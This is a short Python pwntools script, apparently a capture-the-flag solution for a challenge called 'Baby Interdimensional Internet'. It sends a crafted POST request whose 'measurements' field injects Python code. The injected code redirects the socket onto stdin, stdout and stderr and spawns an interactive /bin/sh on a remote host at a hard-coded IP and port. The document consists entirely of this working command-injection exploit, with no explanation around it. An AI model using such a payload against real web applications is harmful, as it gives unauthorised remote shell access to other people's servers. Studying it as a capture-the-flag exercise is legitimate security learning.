# Baby Interdimensional Internet
# POST Parameter Command Injection

from pwn import *

#inject command to start interactive shell
#redirect stdin,stdout,stderr to output
command  = '1;exec "'
command += 'a=__import__(\'os\');'
command += 'b=__import__(\'subprocess\');'
command += 'a.dup2(4, 0);'
command += 'a.dup2(4, 1);'
command += 'a.dup2(4, 2);'
command += 'b.call([\'/bin/sh\', \'-i\'])"'

#create the POST body
body = 'ingredient=x&measurements={}'.format(command)

#build the HTTP POST request
post = "POST / HTTP/1.1\r\n"
post += "Content-Type: application/x-www-form-urlencoded\r\n"
post += "Content-Length: {}\r\n".format(len(body))
post += "Connection: keep-alive\r\n"
post += "\r\n"
post += "{}\r\n".format(body)
post += "\r\n"

#use pwntools for an interactive shell
shell = remote('167.71.143.20',32090)
shell.send(post)
shell.interactive()
shell.close()


